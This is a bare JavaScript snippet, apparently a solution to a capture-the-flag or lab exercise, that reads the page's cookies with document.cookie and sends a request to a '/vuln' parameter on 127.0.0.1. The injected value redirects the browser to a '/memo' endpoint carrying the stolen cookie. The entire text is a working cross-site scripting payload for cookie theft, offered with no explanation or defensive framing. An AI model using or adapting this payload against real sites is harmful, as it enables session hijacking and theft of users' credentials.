const Http = new XMLHttpRequest();
var cookie = document.cookie;
var qry = "document.location=http://127.0.0.1/memo?memo="+cookie;
var path = "http://127.0.0.1/vuln?param="+qry;
Http.open('GET', path);
Http.send();
